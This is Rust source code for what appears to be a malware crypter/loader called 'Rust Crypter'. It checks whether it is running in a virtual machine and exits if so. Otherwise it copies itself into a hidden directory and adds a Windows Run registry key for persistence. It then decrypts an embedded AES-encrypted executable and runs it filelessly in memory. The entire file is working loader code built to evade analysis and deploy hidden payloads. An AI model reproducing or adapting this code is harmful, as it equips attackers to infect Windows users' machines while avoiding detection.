use aes::cipher::{generic_array::GenericArray, BlockDecrypt, KeyInit};
use aes::Aes128;
use inside_vm::inside_vm;
use std::io::Result;
use std::io::{self, Cursor, Read};
use std::path::Path;
use std::process::Command;
use std::{env, fs};
use winreg::enums::{HKEY_CURRENT_USER, KEY_ALL_ACCESS};
use winreg::RegKey;

fn main() {
    if inside_vm() {
        println!("This is in a vm");

        std::process::exit(0);
    } else {
        println!("NO VM");

        create_infected_directory();
        persistence();

        let pe_bytes = decrypt_file().unwrap();
        fileless(pe_bytes);
    }
}

fn decrypt_file() -> Result<Vec<u8>> {
    // Read encrypted bytes and store bytes of key :3
    let encrypted_bytes = include_bytes!("encrypted_Input.bin");
    let mut key_bytes: [u8; 16] = [0; 16];
    let mut key_file = Cursor::new(include_bytes!("key.txt"));
    key_file.read_exact(&mut key_bytes)?;

    // Gen cipher with the key B-)
    let key = GenericArray::from(key_bytes);
    let cipher = Aes128::new(&key);

    // Decrypt the encrypted bytes in blocks
    let mut decrypted_bytes = Vec::new();
    for block in encrypted_bytes.chunks(16) {
        let mut block_array = GenericArray::clone_from_slice(block);
        cipher.decrypt_block(&mut block_array);
        decrypted_bytes.extend_from_slice(&block_array);
    }

    // Unpad the decrypted bytes
    let padding_size = decrypted_bytes.last().unwrap().clone() as usize;
    let decrypted_bytes = (&decrypted_bytes[..decrypted_bytes.len() - padding_size]).to_vec();

    // return decrypted bytes
    Ok(decrypted_bytes)
}

fn create_infected_directory() -> io::Result<()> {
    let infected_dir = Path::new("C:/Rust Crypter - INFECTED MACHINE");
    fs::create_dir_all(&infected_dir)?;

    let current_exe = env::current_exe()?;
    let current_exe_filename = current_exe.file_name();

    let infected_exe_path = infected_dir.join(current_exe_filename.unwrap());
    fs::copy(&current_exe, &infected_exe_path)?;

    if cfg!(target_os = "windows") {
        Command::new("attrib")
            .arg("+h")
            .arg(infected_dir.as_os_str())
            .output()?;
        Command::new("attrib")
            .arg("+h")
            .arg(infected_exe_path.as_os_str())
            .output()?;
    }

    Ok(())
}

fn persistence() -> io::Result<()> {
    if let Ok(current_exe) = env::current_exe() {
        if let Some(file_name) = current_exe.file_stem() {
            let executable_name = file_name.to_string_lossy();
            let directory_path = "C:/Rust Crypter - INFECTED MACHINE/";
            let file_path = format!("{}{}.exe", directory_path, executable_name);

            // Open the "Run" registry key
            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
            let run_key = hkcu.open_subkey_with_flags(
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                KEY_ALL_ACCESS,
            )?;

            // Add the executable path to the "Run" registry key
            run_key.set_value("RustCrypter", &file_path).err();
        }
    }
    Ok(())
}

fn fileless(bytes: Vec<u8>) {
    unsafe {
        memexec::memexec_exe(&bytes).unwrap();
    }
}
